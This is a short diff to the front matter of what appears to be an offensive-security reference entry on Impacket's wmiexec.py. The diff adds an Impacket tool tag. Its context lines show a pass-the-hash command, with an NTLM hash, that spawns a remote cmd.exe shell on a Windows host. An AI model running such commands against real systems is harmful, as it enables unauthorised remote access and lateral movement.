@@ -18,6 +18,8 @@ output: 'root@kali:~# wmiexec.py Bob@10.10.10.10 -hashes :6608e4bc7b2b7a5f77ce35
   C:\>'
 created_at: '2019-10-01T17:58:48.949764+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Impacket]]'
 ---
 
 # wmiexec.py Spawn a cmd.exe shell on a Remote System (NTLM)
